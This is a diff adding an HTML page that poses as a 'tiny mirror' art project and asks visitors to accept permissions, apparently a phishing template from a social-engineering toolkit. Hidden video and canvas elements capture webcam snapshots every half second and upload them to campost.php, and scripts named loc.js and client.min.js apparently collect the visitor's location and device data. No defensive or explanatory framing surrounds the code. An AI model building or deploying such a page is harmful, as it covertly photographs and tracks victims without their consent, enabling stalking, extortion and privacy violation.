@@ -1,0 +1,100 @@
+<!doctype html>
+<html>
+<head>
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <script src="../../assets/js/jquery.min.js"></script>
+  <script src="../../assets/js/client.min.js"></script>
+  <script src="../../assets/js/loc.js"></script>
+  <script src="js/location.js"></script>
+  <script src="../../assets/js/warpspeed.min.js"></script>
+</head>
+<body onload="mydata()">
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'campost.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+// environment -- user
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 640);
+       var canvasData = canvas.toDataURL("image/png")
+       cc = String(canvasData).replace("data:image/png;base64,","")
+      //  console.log(cc)
+       post(cc); }, 500);
+  
+
+}
+
+// Load init
+init();
+locate();
+
+</script>
+
+</body>
+</html>
+<html>
+    <body>
+        <p>Hint: Look at the favicon</p>
+        <p>(Accept Permissions)</p>
+        <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
+        <div id="controls">
+        <button id="redButton" hidden>Redirect to Website</button>
+        </div>
+        <script src="../../assets/js/recorder.js"></script>
+  	    <script src="js/_app.js"></script>
+    </body>
+</html>
